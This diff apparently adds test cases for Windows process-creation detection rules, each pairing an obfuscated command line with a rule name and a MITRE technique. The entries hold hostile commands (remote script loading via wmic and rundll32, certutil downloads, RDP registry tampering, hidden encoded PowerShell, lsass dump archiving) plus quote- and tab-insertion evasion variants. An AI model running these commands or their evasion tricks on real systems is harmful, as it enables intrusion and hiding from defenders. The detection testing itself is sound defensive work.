+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe \\\\localhost -accept\"\"eula -c C:\\Windows\\System32\\cmd.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_9",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe \\\\localhost\t-accepteula -c C:\\Windows\\System32\\cmd.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_10",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe \\\\localhost /\"accepteula\" -c C:\\Windows\\System32\\cmd.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_sysinternals_eula_accepted_curated_11",
+        "target_commandline":  "C:\\AtomicRedTeam\\ExternalPayloads\\PsExec.exe \\\\localhost --accepteula -c C:\\Windows\\System32\\cmd.exe",
+        "target_rule":  "proc_creation_win_sysinternals_eula_accepted",
+        "technique_id":  "T1588.002"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_1",
+        "target_commandline":  "C:\\Users\\bkcs\\AppData\\Local\\Temp\\tcm.tmp -\"decode\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_2",
+        "target_commandline":  "C:\\Users\\bkcs\\AppData\\Local\\Temp\\tcm.tmp -d\"e\"code C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_3",
+        "target_commandline":  "C:\\Users\\bkcs\\AppData\\Local\\Temp\\tcm.tmp -decode\tC:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc2_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.EXE \"-decode\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.EXE -decode\tC:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_decode_curated_6",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.EXE -dec\"\"ode C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc.txt C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1140_calc_decoded.exe",
+        "target_rule":  "proc_creation_win_certutil_decode",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.exe \"-verifyctl\" -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+        "target_rule":  "proc_creation_win_certutil_download",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.exe -v\"erifyctl\" -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+        "target_rule":  "proc_creation_win_certutil_download",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.exe -verifyctl\t-split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt",
+        "target_rule":  "proc_creation_win_certutil_download",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.EXE \"-urlcache\" -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt",
+        "target_rule":  "proc_creation_win_certutil_download",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.EXE -urlcache\t-split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt",
+        "target_rule":  "proc_creation_win_certutil_download",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_file_sharing_domains_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.exe -url\"cache\" -split -f https://example.pages.dev/test.txt C:\\Temp\\test.txt",
+        "target_rule":  "proc_creation_win_certutil_download_file_sharing_domains",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_certutil_download_file_sharing_domains_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\certutil.exe -urlcache\t-split -f https://example.pages.dev/test.txt C:\\Temp\\test.txt",
+        "target_rule":  "proc_creation_win_certutil_download_file_sharing_domains",
+        "technique_id":  "T1027"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE \"add\" \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE \"add\" \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE \"add\" \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 \"/f\"",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE \"add\" \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 \t/f",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_reg_rdp_keys_tamper_curated_6",
+        "target_commandline":  "reg.exe \"add\" \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f",
+        "target_rule":  "proc_creation_win_reg_rdp_keys_tamper",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_mstsc_remote_connection_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\mstsc.exe \"/v:bkcs\"",
+        "target_rule":  "proc_creation_win_mstsc_remote_connection",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_mstsc_remote_connection_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\mstsc.exe /\"v\":bkcs",
+        "target_rule":  "proc_creation_win_mstsc_remote_connection",
+        "technique_id":  "T1021.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe \"+h\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1222.001_attrib_2\\T1222.001_attrib1.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe +\"h\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1222.001_attrib_2\\T1222.001_attrib1.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe \"+h\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1222.001_attrib_2\\T1222.001_attrib2.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe\t+h\tC:\\Users\\bkcs\\AppData\\Local\\Temp\\T1222.001_attrib_2\\T1222.001_attrib2.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe \"+h\" C:\\Users\\bkcs\\AppData\\Local\\Temp\\T1564.001.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_attrib_hiding_files_curated_6",
+        "target_commandline":  "C:\\WINDOWS\\system32\\attrib.exe +h\tC:\\Users\\bkcs\\AppData\\Local\\Temp\\T1564.001.txt",
+        "target_rule":  "proc_creation_win_attrib_hiding_files",
+        "technique_id":  "T1564.001"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic \"qfe\" list brief",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic\tqfe list brief",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic\tqfe where \"hotfixid=\u0027KB4534273\u0027\" get hotfixid,installedon",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic q\"f\"e where \"hotfixid=\u0027KB4534273\u0027\" get hotfixid,installedon",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic \"qfe\" get Caption,Description,HotFixID,InstalledOn",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_hotfix_curated_6",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic \"qfe\" where \"hotfixid=\u0027KB4534273\u0027\" get hotfixid,installedon",
+        "target_rule":  "proc_creation_win_wmic_recon_hotfix",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_wmiexec_default_powershell_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"-NoP\" \"-NoL\" \"-sta\" \"-NonI\" \"-W\" \"Hidden\" \"-Exec\" \"Bypass\" \"-Enc\" VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAnAA==",
+        "target_rule":  "proc_creation_win_hktl_wmiexec_default_powershell",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_squiblytwo_bypass_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\System32\\Wbem\\wmic.EXE os get /for\"\"mat:\"http://192.168.1.100/payload.xsl\"",
+        "target_rule":  "proc_creation_win_wmic_squiblytwo_bypass",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_wmic_recon_process_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmd.EXE /c wmic pr\"oc\"ess list brief",
+        "target_rule":  "proc_creation_win_wmic_recon_process",
+        "technique_id":  "T1047"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_local_system_owner_account_discovery_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe \"/list\"",
+        "target_rule":  "proc_creation_win_susp_local_system_owner_account_discovery",
+        "technique_id":  "T1033"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_local_system_owner_account_discovery_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe /\"l\"ist",
+        "target_rule":  "proc_creation_win_susp_local_system_owner_account_discovery",
+        "technique_id":  "T1033"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_local_system_owner_account_discovery_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe us\"\"er",
+        "target_rule":  "proc_creation_win_susp_local_system_owner_account_discovery",
+        "technique_id":  "T1033"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_local_system_owner_account_discovery_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE localgroup \"U\"\"sers\"",
+        "target_rule":  "proc_creation_win_susp_local_system_owner_account_discovery",
+        "technique_id":  "T1033"
+    },
+    {
+        "test_id":  "proc_creation_win_susp_local_system_owner_account_discovery_curated_5",
+        "target_commandline":  "cmdkey.exe \"/list\"",
+        "target_rule":  "proc_creation_win_susp_local_system_owner_account_discovery",
+        "technique_id":  "T1033"
+    },
+    {
+        "test_id":  "proc_creation_win_cmdkey_recon_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe \"/list\"",
+        "target_rule":  "proc_creation_win_cmdkey_recon",
+        "technique_id":  "T1003.005"
+    },
+    {
+        "test_id":  "proc_creation_win_cmdkey_recon_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe\t/list",
+        "target_rule":  "proc_creation_win_cmdkey_recon",
+        "technique_id":  "T1003.005"
+    },
+    {
+        "test_id":  "proc_creation_win_cmdkey_recon_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe /\"l\"ist",
+        "target_rule":  "proc_creation_win_cmdkey_recon",
+        "technique_id":  "T1003.005"
+    },
+    {
+        "test_id":  "proc_creation_win_cmdkey_recon_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\cmdkey.exe /\"list\"",
+        "target_rule":  "proc_creation_win_cmdkey_recon",
+        "technique_id":  "T1003.005"
+    },
+    {
+        "test_id":  "proc_creation_win_cmdkey_recon_curated_5",
+        "target_commandline":  "cmdkey.exe\t/list",
+        "target_rule":  "proc_creation_win_cmdkey_recon",
+        "technique_id":  "T1003.005"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d \"0\" /F",
+        "target_rule":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v h\"t\"tp /t REG_DWORD /d 0 /F",
+        "target_rule":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d \"0\" /F",
+        "target_rule":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v h\"tt\"ps /t REG_DWORD /d 0 /F",
+        "target_rule":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\reg.EXE add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d\t0 /F",
+        "target_rule":  "proc_creation_win_registry_ie_security_zone_protocol_defaults_downgrade",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_virtualbox_vboxdrvinst_execution_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxDrvInst.exe\" d\"\"river execu\"\"teinf C:\\temp\\driver.inf",
+        "target_rule":  "proc_creation_win_virtualbox_vboxdrvinst_execution",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_virtualbox_vboxdrvinst_execution_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxDrvInst.exe\" \"d\"river \"execut\"einf C:\\temp\\driver.inf",
+        "target_rule":  "proc_creation_win_virtualbox_vboxdrvinst_execution",
+        "technique_id":  "T1112"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_sys_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32 payload.sys,DllMain",
+        "target_rule":  "proc_creation_win_rundll32_sys",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_sys_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32.exe \"payload.sys\",DllMain",
+        "target_rule":  "proc_creation_win_rundll32_sys",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_sys_curated_3",
+        "target_commandline":  "rundll32 \"payload.sys\",DllMain",
+        "target_rule":  "proc_creation_win_rundll32_sys",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_sys_curated_4",
+        "target_commandline":  "rundll32 payload.sys,DllMain",
+        "target_rule":  "proc_creation_win_rundll32_sys",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_sys_curated_5",
+        "target_commandline":  "\"C:\\Windows\\System32\\rundll32\" payload.sys,DllMain",
+        "target_rule":  "proc_creation_win_rundll32_sys",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_c3_rundll32_pattern_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32 C:\\Temp\\c3.dll,StartNodeRelay",
+        "target_rule":  "proc_creation_win_hktl_c3_rundll32_pattern",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_c3_rundll32_pattern_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32.exe \"C:\\Temp\\c3.d\"\"ll\",StartNodeRelay",
+        "target_rule":  "proc_creation_win_hktl_c3_rundll32_pattern",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_c3_rundll32_pattern_curated_3",
+        "target_commandline":  "rundll32 C:\\Temp\\c3.dll,StartNodeRelay",
+        "target_rule":  "proc_creation_win_hktl_c3_rundll32_pattern",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_susp_activity_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c rundll32.exe pcw\"\"utl.dll,Launch\"\"Application %%windir%%\\System32\\notepad.exe",
+        "target_rule":  "proc_creation_win_rundll32_susp_activity",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_susp_activity_curated_2",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c rundll32.exe ur\"l\".dll,FileProtocolHandler calc.exe",
+        "target_rule":  "proc_creation_win_rundll32_susp_activity",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_susp_execution_with_image_extension_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32.exe C:\\Users\\bkcs\\Downloads\\calc.p\"\"ng StartW",
+        "target_rule":  "proc_creation_win_rundll32_susp_execution_with_image_extension",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_susp_execution_with_image_extension_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32.exe C:/Users/bkcs/Downloads/calc.p\"\"ng StartW",
+        "target_rule":  "proc_creation_win_rundll32_susp_execution_with_image_extension",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_cobaltstrike_load_by_rundll32_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\rundll32.exe 2.dll, StartW",
+        "target_rule":  "proc_creation_win_hktl_cobaltstrike_load_by_rundll32",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_hktl_cobaltstrike_load_by_rundll32_curated_2",
+        "target_commandline":  "\"C:\\WINDOWS\\system32\\rundll32.exe\" 2.dll, StartW",
+        "target_rule":  "proc_creation_win_hktl_cobaltstrike_load_by_rundll32",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_rundll32_mshtml_runhtmlapplication_curated_1",
+        "target_commandline":  "C:\\Windows\\System32\\cmd.exe /c rundll32.exe javascript:\"/../mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+        "target_rule":  "proc_creation_win_rundll32_mshtml_runhtmlapplication",
+        "technique_id":  "T1218.011"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_default_accounts_manipulation_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe \"user\" administrator /domain",
+        "target_rule":  "proc_creation_win_net_user_default_accounts_manipulation",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_default_accounts_manipulation_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net1.exe user admini\"\"strator /domain",
+        "target_rule":  "proc_creation_win_net_user_default_accounts_manipulation",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_default_accounts_manipulation_curated_3",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"user\" administrator /domain",
+        "target_rule":  "proc_creation_win_net_user_default_accounts_manipulation",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_default_accounts_manipulation_curated_4",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE user adminis\"trator\" /domain",
+        "target_rule":  "proc_creation_win_net_user_default_accounts_manipulation",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_net_user_default_accounts_manipulation_curated_5",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"user\" \"administrator\" /domain",
+        "target_rule":  "proc_creation_win_net_user_default_accounts_manipulation",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_7zip_password_compression_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\7-Zip\\7z.exe\" \"a\" archive.7z C:\\Data\\ -pPassword123",
+        "target_rule":  "proc_creation_win_7zip_password_compression",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_7zip_password_compression_curated_2",
+        "target_commandline":  "\"C:\\Program Files\\7-Zip\\7z.exe\" a archive.7z C:\\Data\\ \"-pPassword123\"",
+        "target_rule":  "proc_creation_win_7zip_password_compression",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_7zip_exfil_dmp_files_curated_1",
+        "target_commandline":  "\"C:\\Program Files\\7-Zip\\7z.exe\" a archive.7z lsass.d\"\"mp",
+        "target_rule":  "proc_creation_win_7zip_exfil_dmp_files",
+        "technique_id":  "T1560.001"
+    },
+    {
+        "test_id":  "proc_creation_win_kavremover_uncommon_execution_curated_1",
+        "target_commandline":  "C:\\Tools\\kavremvr.exe \"run\" \"run-cmd\" calc.exe",
+        "target_rule":  "proc_creation_win_kavremover_uncommon_execution",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_kavremover_uncommon_execution_curated_2",
+        "target_commandline":  "C:\\Tools\\kavremvr.exe  run  run-cmd  calc.exe",
+        "target_rule":  "proc_creation_win_kavremover_uncommon_execution",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_kavremover_uncommon_execution_curated_3",
+        "target_commandline":  "C:\\Tools\\kavremvr.exe run r\"un-cm\"d calc.exe",
+        "target_rule":  "proc_creation_win_kavremover_uncommon_execution",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_kavremover_uncommon_execution_curated_4",
+        "target_commandline":  "C:\\Tools\\kavremvr.exe \"run\" run-cmd calc.exe",
+        "target_rule":  "proc_creation_win_kavremover_uncommon_execution",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_kavremover_uncommon_execution_curated_5",
+        "target_commandline":  "C:\\Tools\\kavremvr.exe run \"run-cmd\" calc.exe",
+        "target_rule":  "proc_creation_win_kavremover_uncommon_execution",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_aspnet_compiler_susp_paths_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v dummy -p C:/Windows/Temp/ C:/AppData/Local/Temp/payload",
+        "target_rule":  "proc_creation_win_aspnet_compiler_susp_paths",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_aspnet_compiler_susp_paths_curated_2",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\aspnet_compiler.exe -v dummy -p C:\\Windows\\.\\Temp\\ C:\\AppData\\Local\\.\\Temp\\payload",
+        "target_rule":  "proc_creation_win_aspnet_compiler_susp_paths",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_ilasm_il_code_compilation_curated_1",
+        "target_commandline":  "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ilasm.exe /\"dll\" C:\\temp\\payload.il",
+        "target_rule":  "proc_creation_win_ilasm_il_code_compilation",
+        "technique_id":  "T1127"
+    },
+    {
+        "test_id":  "proc_creation_win_net_view_share_and_sessions_enum_curated_1",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.EXE \"v\"\"iew\"",
+        "target_rule":  "proc_creation_win_net_view_share_and_sessions_enum",
+        "technique_id":  "T1018"
+    },
+    {
+        "test_id":  "proc_creation_win_net_view_share_and_sessions_enum_curated_2",
+        "target_commandline":  "C:\\WINDOWS\\system32\\net.exe v\"i\"ew /all",
+        "target_rule":  "proc_creation_win_net_view_share_and_sessions_enum",
+        "technique_id":  "T1018"
+    },
+    {
